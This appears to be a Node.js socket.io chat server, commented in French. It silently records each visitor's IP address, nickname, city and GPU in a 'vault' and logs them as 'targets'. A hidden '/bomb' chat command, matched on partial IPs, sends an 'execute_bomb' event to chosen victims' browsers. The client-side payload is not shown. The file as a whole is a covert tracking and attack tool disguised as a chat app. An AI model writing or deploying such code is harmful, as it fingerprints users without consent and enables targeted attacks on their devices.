const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http);

app.use(express.static(__dirname));

const vault = {};

io.on('connection', (socket) => {
    // 1. LE PERCEUR : On check toutes les sources d'IP possibles
    const ip = (socket.handshake.headers['x-forwarded-for'] || 
                socket.handshake.address || 
                socket.conn.remoteAddress).split(',')[0].trim();

    socket.on('check_device', (info) => {
        // On enregistre l'IP avec son socket ID actuel
        vault[ip] = { sid: socket.id, name: info.name };
        
        console.log(`
        ╔═════════════ CIBLE DÉTECTÉE ═════════════╗
        ║ PSEUDO : ${info.name}
        ║ IP     : ${ip} <--- UTILISER CELLE-CI POUR /BOMB
        ║ VILLE  : ${info.geo.city}
        ║ MATOS  : ${info.hardware.gpu}
        ╚══════════════════════════════════════════╝
        `);
    });

    socket.on('chat message', (data) => {
        const msg = data.text.trim();

        // 2. LA BOMBE CHIRURGICALE
        if (msg.startsWith("/bomb ")) {
            const targetIP = msg.split(" ")[1];
            let impact = false;

            // On scanne la vault pour trouver une correspondance (même partielle)
            Object.keys(vault).forEach(storedIP => {
                if (storedIP.includes(targetIP)) {
                    io.to(vault[storedIP].sid).emit('execute_bomb');
                    impact = true;
                }
            });

            if (impact) {
                console.log(`[!!!] EXPLOSION RÉUSSIE SUR : ${targetIP}`);
            } else {
                console.log(`[?] CIBLE INTROUVABLE : ${targetIP}`);
            }
        } else {
            io.emit('chat message', data);
        }
    });

    socket.on('disconnect', () => {
        // On garde l'IP en mémoire un moment au cas où il reco vite
    });
});

http.listen(3000, () => { console.log("GALAXY_OS_ARMED_V11"); });
